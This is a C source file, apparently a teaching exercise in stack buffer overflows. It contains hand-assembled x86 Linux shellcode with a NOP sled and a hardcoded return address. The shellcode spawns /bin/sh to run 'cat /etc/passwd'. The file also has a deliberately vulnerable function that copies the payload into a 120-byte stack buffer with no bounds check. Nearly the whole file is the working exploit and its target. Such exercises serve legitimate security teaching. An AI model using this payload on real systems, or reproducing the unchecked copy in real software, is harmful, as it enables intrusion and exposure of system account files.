#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void doTest();

int main(int argc, char * argv[]){

    /* call the vulnerable function */
    doTest();

    exit(0);
}
// 145 = 41 NOP Padding + 103 exploit commands + 1 Null Characters
char compromise[145] = {
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  //  A total of 40 nop commands plus 3 after
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  //  140 - 103 + 4 to get the padding for the 
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  //  offset start of the return address
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  //
0x90,                                               //             nop
0x90,                                               //             nop
0x90,                                               //             nop
0xEB,0x29,                                          // start:      jmp short codeEnd
0x5E,                                               // start2:     pop esi
0x31,0xC0,                                          //             xor eax,eax
0x88,0x46,0x07,                                     //             mov [byte esi+flagStr-exeStr-2],al
0x88,0x46,0x0B,                                     //             mov [byte esi+cmdStr-exeStr-1],al
0x88,0x46,0x20,                                     //             mov [byte esi+arrayAddr-exeStr-1],al
0x89,0x46,0x2D,                                     //             mov [byte esi+arrayAddr-exeStr+12],eax
0x89,0x76,0x21,                                     //             mov [byte esi+arrayAddr-exeStr],esi 
0x8D,0x7E,0x09,                                     //             lea edi,[byte esi+flagStr-exeStr]
0x89,0x7E,0x25,                                     //             mov [byte esi+arrayAddr-exeStr+4],edi
0x8D,0x7E,0x0C,                                     //             lea edi,[byte esi+cmdStr-exeStr]
0x89,0x7E,0x29,                                     //             mov [byte esi+arrayAddr-exeStr+8],edi
0xB0,0x0B,                                          //             mov al,0x0b
0x89,0xF3,                                          //             mov ebx,esi
0x8D,0x4E,0x21,                                     //             lea ecx,[byte esi+arrayAddr-exeStr]
0x31,0xD2,                                          //             xor edx,edx
0xCD,0x80,                                          //             int 0x80
0xE8,0xD2,0xFF,0xFF,0xFF,                           // codeEnd:    call start2
0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,0x58,0x79,       // exeStr:     db "/bin/shXy"
0x2D,0x63,0x58,                                     // flagStr:    db "-cX"
0x63,0x61,0x74,0x20,0x2F,0x65,0x74,0x63,0x2F,       // cmdStr:     db "cat /etc/passwd;exitX"
0x70,0x61,0x73,0x73,0x77,0x64,0x3B,0x65,0x78,       //
0x69,0x74,0x58,                                     //
0xFF,0xFF,0xFF,0xFF,                                // arrayAddr:  dd 0xffffffff
0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
0x4A,0xF8,0xFF,0xBF                                 // newAddr:    dd newAddr-start 
// Return Address: SP - 4 - newAddr = 0xBFFFF8AF - 0x04 - 0x61 = 0xBFFFF84A          
};


char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "WXYZ";
   

int i;
void doTest(){
    char buffer[120];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */

    for (i = 0; compromise[i]; i++)
	buffer[i] = compromise[i];
}

